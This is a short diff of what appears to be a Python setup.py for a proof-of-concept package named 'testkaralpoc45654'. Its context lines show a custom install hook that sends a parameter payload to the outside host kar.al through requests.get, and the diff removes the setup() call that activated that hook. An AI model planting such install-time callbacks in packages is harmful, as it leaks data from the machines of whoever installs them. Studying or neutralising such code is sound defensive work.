@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("https://kar.al",params = ploads)
 
 
-setup(name='testkaralpoc45654',
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                       
